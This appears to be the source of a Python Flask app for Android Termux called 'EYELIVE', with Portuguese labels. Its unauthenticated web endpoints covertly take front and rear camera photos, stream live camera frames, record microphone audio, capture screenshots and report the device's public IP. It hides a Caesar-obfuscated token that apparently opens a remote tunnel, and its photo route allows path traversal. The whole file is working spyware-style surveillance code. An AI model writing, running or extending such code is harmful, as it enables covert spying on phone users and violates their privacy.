from flask import Flask, render_template_string, jsonify, request, send_file
import os, json, threading, time, subprocess, requests as req
from datetime import datetime

def _tk():
    t = "now_7fobDPqMyVGXyhzQkT5SLhvaUkpKNr1gh7KC"
    r = ""
    for c in t:
        if c.isalpha():
            b = ord('a') if c.islower() else ord('A')
            r += chr((ord(c) - b - 7) % 26 + b)
        else: r += c
    return r

app = Flask(__name__)
DEVICE_NAME = os.environ.get("DEVICE_NAME", "Celular")
TOKEN = _tk()
HOME_DIR = "/data/data/com.termux/files/home"
FOTOS_DIR = f"{HOME_DIR}/eyelive_fotos"
LIVE_DIR = f"{HOME_DIR}/eyelive_live"
os.makedirs(FOTOS_DIR, exist_ok=True)
os.makedirs(LIVE_DIR, exist_ok=True)

dados = {"nome":DEVICE_NAME,"bateria":"?%","carregando":False,"gps":{"lat":0,"lng":0},"ip":"","fotos":[],"ultimo_update":"","status":"online"}
live_ativo = {"frontal": False, "traseira": False}

def shell(cmd):
    try: return subprocess.check_output(cmd,shell=True,text=True,timeout=5).strip()
    except: return "?"

def coletar():
    while True:
        try:
            # Live: atualizar frame
            if live_ativo["frontal"]:
                shell(f"termux-camera-photo -c 0 {LIVE_DIR}/frontal.jpg 2>/dev/null")
            if live_ativo["traseira"]:
                shell(f"termux-camera-photo -c 1 {LIVE_DIR}/traseira.jpg 2>/dev/null")
            
            b=shell("termux-battery-status 2>/dev/null")
            if b and "percentage" in b:
                bat=json.loads(b)
                dados["bateria"]=str(bat.get("percentage","?"))+"%"
                dados["carregando"]=bat.get("plugged","")!=""
            dados["ip"]=shell("curl -4 -s ifconfig.me 2>/dev/null") or "?"
            dados["ultimo_update"]=datetime.now().strftime("%H:%M:%S")
            dados["fotos"]=sorted([f for f in os.listdir(FOTOS_DIR) if f.endswith('.jpg')])[-10:]
        except: pass
        time.sleep(2)

threading.Thread(target=coletar,daemon=True).start()

try:
    with open('index.html','r') as f: HTML=f.read()
except:
    HTML="<h1>EYELIVE</h1>"

@app.route('/')
def index():
    return render_template_string(HTML, DEVICE=DEVICE_NAME)

@app.route('/api/status')
def api_status():
    return jsonify(dados)

@app.route('/cmd/<c>')
def cmd(c):
    if c=='foto_frontal':
        n=f"frontal_{datetime.now().strftime('%H%M%S')}.jpg"
        threading.Thread(target=lambda:shell(f"termux-camera-photo -c 0 {FOTOS_DIR}/{n} 2>/dev/null"),daemon=True).start()
        return jsonify({"msg":"Foto frontal salva!"})
    elif c=='foto_traseira':
        n=f"traseira_{datetime.now().strftime('%H%M%S')}.jpg"
        threading.Thread(target=lambda:shell(f"termux-camera-photo -c 1 {FOTOS_DIR}/{n} 2>/dev/null"),daemon=True).start()
        return jsonify({"msg":"Foto traseira salva!"})
    elif c=='live_frontal':
        live_ativo["frontal"]=True
        return jsonify({"msg":"Live frontal ON"})
    elif c=='live_traseira':
        live_ativo["traseira"]=True
        return jsonify({"msg":"Live traseira ON"})
    elif c=='parar_frontal':
        live_ativo["frontal"]=False
        return jsonify({"msg":"Live frontal OFF"})
    elif c=='parar_traseira':
        live_ativo["traseira"]=False
        return jsonify({"msg":"Live traseira OFF"})
    elif c=='audio':
        threading.Thread(target=lambda:shell(f"termux-microphone-record -f {HOME_DIR}/eyelive_audio.aac -l 30 -q 2>/dev/null"),daemon=True).start()
        return jsonify({"msg":"Gravando 30s..."})
    elif c=='screenshot':
        threading.Thread(target=lambda:shell(f"screencap {HOME_DIR}/eyelive_screenshot.png 2>/dev/null"),daemon=True).start()
        return jsonify({"msg":"Screenshot salvo!"})
    return jsonify({"msg":"OK"})

@app.route('/live/<cam>')
def live(cam):
    path = f"{LIVE_DIR}/{cam}.jpg"
    if os.path.exists(path):
        return send_file(path, mimetype='image/jpeg')
    return "", 404

@app.route('/foto/<nome>')
def foto(nome):
    p=f"{FOTOS_DIR}/{nome}"
    if os.path.exists(p): return send_file(p,mimetype='image/jpeg')
    return "",404

@app.route('/audio_live')
def audio_live():
    path = f"{HOME_DIR}/eyelive_audio.aac"
    if os.path.exists(path):
        return send_file(path, mimetype='audio/aac')
    return "",404

if __name__=='__main__':
    print(f"EYELIVE - {DEVICE_NAME}")
    app.run(host='0.0.0.0',port=5050,debug=False,threaded=True)
